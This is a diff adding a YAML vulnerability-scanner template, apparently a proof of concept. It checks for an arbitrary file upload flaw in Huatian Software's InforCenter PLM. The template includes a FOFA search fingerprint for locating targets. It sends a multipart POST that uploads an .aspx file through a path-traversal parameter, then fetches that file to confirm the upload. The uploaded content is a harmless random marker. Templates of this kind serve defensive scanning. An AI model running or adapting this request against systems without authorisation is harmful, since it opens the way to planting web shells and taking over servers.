@@ -1,0 +1,33 @@
+id: poc-yaml-hoteamsoft-inforcenter-plm-uploadfilehttp-anyfile-upload
+info:
+  name: 华天软件InforCenter PLM uploadFileHttp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 华天软件InforCenter-PLM
+  fofa: body="/Base/BaseHandler.ashx"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,".aspx")
+  output:
+  - regex_match(body,"/(?P<file>[0-9a-z-]+).aspx")
+- method: GET
+  path: /Files/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
